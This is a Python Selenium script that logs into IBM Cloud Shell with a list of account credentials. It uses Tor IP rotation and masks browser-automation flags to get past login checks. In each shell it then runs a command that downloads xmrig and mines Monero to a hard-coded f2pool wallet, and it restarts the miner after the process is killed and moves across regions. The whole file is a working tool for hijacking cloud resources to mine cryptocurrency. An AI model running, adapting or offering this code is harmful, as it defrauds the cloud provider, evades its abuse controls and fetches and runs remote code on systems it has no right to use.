import json
import sys

import requests
import time
from concurrent.futures._base import as_completed
from time import sleep

from random_user_agent.user_agent import UserAgent
from random_user_agent.params import SoftwareName, OperatingSystem
from requests.exceptions import ProxyError
from selenium import webdriver
from selenium.common.exceptions import WebDriverException, NoSuchFrameException, ElementClickInterceptedException, \
    ElementNotInteractableException, TimeoutException
from selenium.webdriver.chrome.webdriver import WebDriver
from selenium.webdriver.common.by import By
import selenium.webdriver.support.expected_conditions as EC
from selenium.webdriver.support.wait import WebDriverWait
from concurrent.futures import ThreadPoolExecutor

from stem import Signal, process
from stem.control import Controller


def worker_callbacks(f):
    e = f.exception()

    if e is None:
        return

    trace = []
    tb = e.__traceback__
    while tb is not None:
        trace.append({
            "filename": tb.tb_frame.f_code.co_filename,
            "name": tb.tb_frame.f_code.co_name,
            "lineno": tb.tb_lineno
        })
        tb = tb.tb_next
    print(str({
        'type': type(e).__name__,
        'message': str(e),
        'trace': trace
    }))


xmr_command = """./xmrig -o xmr.f2pool.com:13531 -u 44g7WQw7AGcE7sDmRzTUYQRChiJ6B7sokXyXYfCTz8A3Uv6fSxtfYVBA1S77jLFPJWK4QqAWV9dTZP7k5gB7RATk5vHZDYN"""
comand = """ wget https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-linux-static-x64.tar.gz&&tar -zxvf xmrig-6.11.2-linux-static-x64.tar.gz&&cd xmrig-6.11.2&&""" + xmr_command
address = "https://cloud.ibm.com/shell"
s_time = time.time()


class CloudShell:
    def __init__(self, user, passwd, miner_id):
        self.user = user
        self.passwd = passwd
        self.miner_id = miner_id
        self.log_tag = f"{miner_id}_{user.split('@')[0]}: "
        self.driver = self._configure_web_driver()
        self.tor_process = self._setUp_tor()

    def _log(self, msg):
        print(f'{self.log_tag}{msg}')

    def _configure_web_driver(self):
        options = webdriver.FirefoxOptions()
        options.add_argument("--headless")
        software_names = [SoftwareName.CHROME.value, SoftwareName.FIREFOX.value]
        operating_systems = [OperatingSystem.WINDOWS.value, OperatingSystem.MAC.value]
        ua = UserAgent(software_names=software_names, operating_systems=operating_systems).get_random_user_agent()
        options.add_argument(f"--user-agent={ua}")
        options.add_argument("--no-sandbox")
        options.add_argument("--ignore-ssl-errors=true")
        options.add_argument("--ssl-protocol=any")
        options.add_argument("--window-size=1920,1080")
        options.add_argument("--disable-gpu")
        options.add_argument("--start-maximized")
        options.add_argument("--disable-blink-features")
        options.add_argument("--disable-blink-features=AutomationControlled")
        # options.accept_insecure_certs = True
        profile = webdriver.FirefoxProfile()
        profile.accept_untrusted_certs = True
        profile.assume_untrusted_cert_issuer = True
        profile.set_preference("intl.accept_languages", "us-en")
        profile.set_preference('permissions.default.image', 2)
        profile.set_preference('dom.ipc.plugins.enabled.libflashplayer.so', 'false')
        profile.update_preferences()
        # options.profile=profile
        geckodriver = "/usr/bin/geckodriver"
        driver = webdriver.Firefox(executable_path=geckodriver, options=options, firefox_profile=profile)
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        driver.maximize_window()
        return driver

    def _setUp_tor(self):
        c_port = 9050 + int(self.miner_id) * 2
        config = {
            "DataDirectory": f"./tordata{c_port}",
            'ControlPort': f'{c_port}',
            "SocksPort": f"{c_port + 1}"}
        return process.launch_tor_with_config(config, tor_cmd=r"tor")

    def _setup_proxy(self, clear=False):
        self.driver.get("about:config")
        proxy_type = 5 if clear else 1
        ip = "" if clear else "127.0.0.1"
        port = 0 if clear else 9050 + int(self.miner_id) * 2 + 1
        setupScript = f"""var
                        prefs = Components.classes["@mozilla.org/preferences-service;1"]
                        .getService(Components.interfaces.nsIPrefBranch);
                        prefs.setIntPref("network.proxy.type", {proxy_type});
                        prefs.setCharPref("network.proxy.socks", "{ip}");
                        prefs.setIntPref("network.proxy.socks_port", {port});
                        prefs.setBoolPref("network.proxy.socks_remote_dns",false);"""
        self.driver.execute_script(setupScript)

    def _switch_ip(self):
        with Controller.from_port(port=9050 + int(self.miner_id) * 2) as controller:
            controller.authenticate()
            controller.signal(Signal.NEWNYM)

    def _check_dialog(self, timeout=30) -> bool:
        try:
            self.driver.find_element_by_class_name("truste_overlay")
            self._log("show trust_overlay")
            WebDriverWait(self.driver, timeout).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "[title='TrustArc Cookie Consent Manager']")))
            trust_frame = self.driver.find_element_by_css_selector("[title='TrustArc Cookie Consent Manager']")
            self.driver.switch_to.frame(trust_frame)
            WebDriverWait(self.driver, 30).until(EC.presence_of_element_located((By.CLASS_NAME, "pdynamicbutton")))
            cookie_dialog = self.driver.find_element_by_class_name("pdynamicbutton")
            cookie_dialog.find_element_by_class_name("call").click()
            self._log("click truste_overlay")
            sleep(5)
            self.driver.switch_to.default_content()
            return True
        except WebDriverException as e:
            self._log(f'check_dialog error: {e.msg}')
            self.driver.switch_to.default_content()
            return False

    def check_disconnection(self, tiemout=10):
        try:
            self.driver.switch_to.default_content()
            WebDriverWait(self.driver, timeout=tiemout).until(
                EC.presence_of_element_located((By.CLASS_NAME, "tab-notification__action-list")))
            retry_tab = self.driver.find_element_by_class_name("tab-notification__action-list")
            retry_tab.find_element_by_tag_name("button").click()
            self._log("disconnect,click reconnect button")
        except WebDriverException:
            self.driver.switch_to.frame(self.driver.find_element(By.CSS_SELECTOR, "[title='IBM Cloud Shell']"))

    def check_another_connection(self) -> bool:
        try:
            self.driver.switch_to.default_content()
            notification = self.driver.find_element_by_class_name('notification-wrapper')
            if notification.find_element_by_tag_name(
                    'span').text == 'Your session was transferred to another browser tab.':
                self._log(f"run on another window")
                return True
            else:
                return False
        except WebDriverException:
            self.driver.switch_to.frame(self.driver.find_element(By.CSS_SELECTOR, "[title='IBM Cloud Shell']"))
            return False

    def check_connection(self, timeout=10) -> bool:
        try:
            self.driver.switch_to.default_content()
            WebDriverWait(self.driver, timeout).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "[title='IBM Cloud Shell']")))
            self.driver.switch_to.frame(self.driver.find_element(By.CSS_SELECTOR, "[title='IBM Cloud Shell']"))
            return True
        except WebDriverException:
            return False

    def _do_login(self):
        self._setup_proxy()
        self._log("start get /shell")
        self.driver.get(address)
        ip_count = 0
        try:
            while True:
                try:
                    WebDriverWait(self.driver, 180).until(
                        EC.presence_of_element_located((By.CLASS_NAME, "login-form__realm-user-id-row")))
                    user_form = self.driver.find_element_by_class_name("login-form__realm-user-id-row")
                    user_id = user_form.find_element_by_id("userid")
                    user_id.clear()
                    user_id.send_keys(self.user)
                    user_form.find_element_by_tag_name("button").click()
                    self._log("send username")
                    try:
                        WebDriverWait(self.driver, 30).until(
                            EC.presence_of_element_located((By.CLASS_NAME, "error-header")))
                        self._log(
                            'username get err={driver.find_element_by_class_name("error-header").get_attribute("innerHTML")}')
                        if ip_count < 5:
                            ip_count = ip_count + 1
                            self._switch_ip()
                            continue
                        raise WebDriverException(f"{self.user} tor ip invalidate")
                    except TimeoutException:
                        self._log("pass ip validate,start clear proxy")
                        self.tor_process.terminate()
                        self.driver.execute_script("window.open('')")
                        default_handle = self.driver.current_window_handle
                        handles = list(self.driver.window_handles)
                        handles.remove(default_handle)
                        self.driver.switch_to.window(handles[0])
                        self._setup_proxy(clear=True)
                        self.driver.close()
                        self.driver.switch_to.window(default_handle)
                    break
                except (ElementClickInterceptedException, ElementNotInteractableException):
                    self._check_dialog()
                    continue
            while True:
                try:
                    WebDriverWait(self.driver, 180).until(
                        EC.presence_of_element_located((By.CSS_SELECTOR, "[class='login-form__password-row ']")))
                    passwd_form = self.driver.find_element_by_class_name("login-form__password-row ")
                    passwd_input = passwd_form.find_element_by_id("password")
                    passwd_input.clear()
                    passwd_input.send_keys(self.passwd)
                    self._log("send passwd")
                    self.driver.find_elements_by_css_selector('[class="login-form__button bx--btn bx--btn--primary"]')[
                        1].click()
                    self._log("click login")
                    break
                except (ElementClickInterceptedException, ElementNotInteractableException) as e:
                    self._log(f'do login failed,msg= {e.msg}')
                    if self._check_dialog(60):
                        continue
                    else:
                        self._log(f"login failed,source page={self.driver.page_source}")
                        raise Exception(f"{self.log_tag} login failed")
            start_time = time.time()
            while True:
                if address in self.driver.current_url:
                    self._log("enter shell success")
                    break
                else:
                    c_time = time.time()
                    if c_time - start_time > 180:
                        self._log(f"enter shell too long,re enter,curentUrl={self.driver.current_url}")
                        raise WebDriverException("userid or passwd error,relogin")
                    sleep(2)
        except WebDriverException as e:
            self._log(f"login failed msg={e.msg}")
            self.driver.delete_all_cookies()
            self.tor_process.terminate()
            self._do_login()
        while True:
            try:
                WebDriverWait(self.driver, 120).until(
                    EC.presence_of_element_located((By.CLASS_NAME, "bx--header__global")))
                header = self.driver.find_element_by_class_name("bx--header__global")
                location = header.find_element_by_class_name("header__location-name").text
                self._log(f"location is {location}")
                self._check_dialog()
                break
            except WebDriverException:
                self._log(": enter shell too long,refresh page")
                self.driver.refresh()

    def _change_region(self, region, index) -> bool:
        max_try = 0
        while max_try < 3:
            try:
                self.driver.switch_to.default_content()
                WebDriverWait(self.driver, 120).until(
                    EC.presence_of_element_located((By.CLASS_NAME, "bx--header__global")))
                header = self.driver.find_element_by_class_name("bx--header__global")
                location = header.find_element_by_class_name("header__location-name").text
                if location == region:
                    return True
                header.find_element_by_css_selector(
                    "[class='header__location-change-button bx--btn bx--btn--ghost']").click()
                WebDriverWait(self.driver, 20).until(EC.presence_of_element_located((By.ID, "selectRegion")))
                selects = self.driver.find_element(By.ID, "selectRegion")
                selects.click()
                sleep(3)
                selects.find_elements_by_tag_name('option')[index].click()
                self.driver.find_element(By.CSS_SELECTOR, "[class='bx--btn bx--btn--primary']").click()
                return True
            except WebDriverException as e:
                max_try = max_try + 1
                try:
                    WebDriverWait(self.driver, 1).until(
                        EC.presence_of_element_located((By.CLASS_NAME, "bx--modal-close")))
                    self.driver.find_element(By.CLASS_NAME, "bx--modal-close").click()
                except WebDriverException:
                    pass
        self._log(f"change region to {region} failed")
        return False

    def _send_command(self):
        while True:
            try:
                if not self.check_connection(timeout=60):
                    if self.check_another_connection():
                        if time.time() - s_time < 7200:
                            return True
                        return False
                    self._log("connect failed,try to refresh")
                    self.driver.refresh()
                    continue
                sleep(3)
                # print runnning
                eles = self.driver.find_elements_by_css_selector("[role='listitem']")
                killed = False
                is_running = False
                for item in eles:
                    if "cloudshell:~$" == str(item.text)[-13:]:
                        item.send_keys(comand + "." + self.miner_id + "\n")
                        is_running = True
                        self._log("send command")
                        break
                    if killed:
                        item.send_keys(xmr_command + "." + self.miner_id + "\n")
                        is_running = True
                        self._log("send command after Killed")
                        break
                    if item.text == "Blank line":
                        continue
                    if item.text == "Killed":
                        self._log(" Killed")
                        killed = True
                        continue
                    if item.text.startswith("[20"):
                        is_running = True
                if self.check_another_connection():
                    return time.time() - s_time < 7200
                if is_running:
                    return True
                self.check_disconnection(1)
            except WebDriverException as e:
                self._log(f"run shell error={e.msg},refresh")
                self.driver.refresh()

    def start(self):
        self._do_login()
        while True:
            for index, region in enumerate(['Dallas', 'Frankfurt', 'Tokyo']):
                if self._change_region(index, region):
                    if not self._send_command():
                        return self.user
                elif self.driver.current_url != address:
                    raise Exception("shell may loss state")
                else:
                    self.driver.refresh()


def run_selenium(account):
    cloud_shell = None
    try:
        cloud_shell = CloudShell(account['user'], account['passwd'], account['id'])
        cloud_shell.start()
    except Exception as e:
        print(f"{account['user']} run selenium failed,{e}")
        if cloud_shell is not None:
            cloud_shell.driver.quit()
            cloud_shell.tor_process.terminate()
        run_selenium(account)


if __name__ == '__main__':
    items = sys.argv[1]
    accounts = json.loads(items)
    pool = ThreadPoolExecutor(accounts.__len__())
    task_list = []
    for account in accounts:
        task_list.append(pool.submit(run_selenium, account))
    for task in as_completed(task_list):
        print(f"{task.result()} finished")

    print("all task finished")
